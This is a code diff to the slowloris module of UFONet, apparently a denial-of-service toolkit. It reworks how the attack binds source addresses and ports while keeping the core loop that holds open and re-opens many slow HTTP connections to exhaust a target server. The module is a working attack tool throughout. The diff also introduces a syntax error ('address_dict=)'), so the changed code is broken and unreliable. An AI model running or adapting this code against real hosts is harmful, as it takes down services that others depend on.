@@ -15,8 +15,12 @@ try:
 except:
     from urllib.parse import urlparse
 
+def randPort(start, end):
+    x = random.randint(start, end)
+    return x
+
 # UFONet Slow HTTP requests (LORIS) + [AI] WAF Detection
-def setupSocket(self, ip, source = None):
+def setupSocket(self, ip, address_dict):
     method = random.choice(self.methods)
     port = 80
     if ip.startswith('http://'):
@@ -28,8 +32,9 @@ def setupSocket(self, ip, source = None):
     self.user_agent = random.choice(self.agents).strip()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    if source is not None:
-        sock.bind((source, 0))
+    port_no = randPort(address_dict['start'], address_dict['end'])
+    if address_dict['source'] is not None:
+        sock.bind((address_dict['source'], port_no))
 
     sock.settimeout(10)
     if port == 443:
@@ -82,26 +87,26 @@ def setupSocket(self, ip, source = None):
                     return
     return sock, ip
 
-def tractor(self, ip, requests, source = None): 
+def tractor(self, ip, requests, address_dict): 
     n=0
     try:
         for i in range(requests): 
             n=n+1
             try:
-                sock, ip = setupSocket(self, ip, source)
-                print("[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]")
+                sock, ip = setupSocket(self, ip, address_dict)
+                # print("[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]")
             except:
                 print("[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"]")
             self.sockets.append(sock)
         while True: # try to abuse HTTP Headers
             for sock in list(self.sockets):
                 try: 
-                    sock, ip = setupSocket(self, ip, source)
+                    sock, ip = setupSocket(self, ip, address_dict)
                 except socket.error:
                     self.sockets.remove(sock)
             for i in range(requests - len(self.sockets)):
                 print("[Info] [AI] [LORIS] Re-opening closed 'tractor beam' -> [RE-LINKED!]")
-                sock, ip = setupSocket(self, ip, source)
+                sock, ip = setupSocket(self, ip, address_dict=)
                 if sock:
                     self.sockets.append(sock)
     except:
@@ -123,7 +128,7 @@ class LORIS(object):
             self.agents.append(agent)
         self.methods = ['GET', 'POST', 'X-METHOD'] # supported HTTP requests methods
 
-    def attacking(self, target, requests, source = None):
+    def attacking(self, target, requests, address_dict):
         print("[Info] [AI] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]")
         try:
             ip = socket.gethostbyname(target)
@@ -138,4 +143,4 @@ class LORIS(object):
                     ip = str(rd)
             except:
                 ip = target
-        tractor(self, ip, requests, source) # attack with LORIS using threading
+        tractor(self, ip, requests, address_dict) # attack with LORIS using threading
